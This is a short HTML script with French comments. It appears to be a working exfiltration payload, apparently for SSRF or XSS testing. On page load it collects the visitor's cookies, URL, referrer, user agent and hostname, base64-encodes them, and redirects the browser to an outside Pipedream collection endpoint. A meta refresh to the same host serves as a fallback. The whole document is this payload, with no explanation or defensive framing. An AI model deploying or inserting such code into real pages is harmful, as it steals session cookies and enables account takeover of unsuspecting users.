<script>
// Encode et redirige toutes les données sensibles vers Pipedream
const data = {
    t: new Date().toISOString(),
    u: window.location.href,
    r: document.referrer,
    a: navigator.userAgent,
    c: document.cookie,
    h: window.location.hostname
};

// Créer l'URL avec les données encodées
const pipedream = 'https://eo1yzt16ee3bzu9.m.pipedream.net';
const params = new URLSearchParams();
params.append('data', btoa(JSON.stringify(data)));
params.append('from', 'target-se-ssrf');
params.append('v', '1.0');

// Redirection finale
window.location.href = `${pipedream}?${params.toString()}`;
</script>
<meta http-equiv="refresh" content="0; url=https://eo1yzt16ee3bzu9.m.pipedream.net/?fallback=1" />
